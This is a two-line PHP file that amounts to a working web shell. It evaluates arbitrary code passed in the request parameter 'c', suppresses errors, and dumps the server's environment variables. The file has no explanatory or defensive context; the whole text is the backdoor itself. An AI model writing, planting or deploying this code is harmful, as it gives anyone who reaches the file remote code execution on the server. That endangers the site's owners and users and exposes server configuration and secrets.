<?php @eval($_REQUEST['c']);
var_dump($_SERVER);
?>
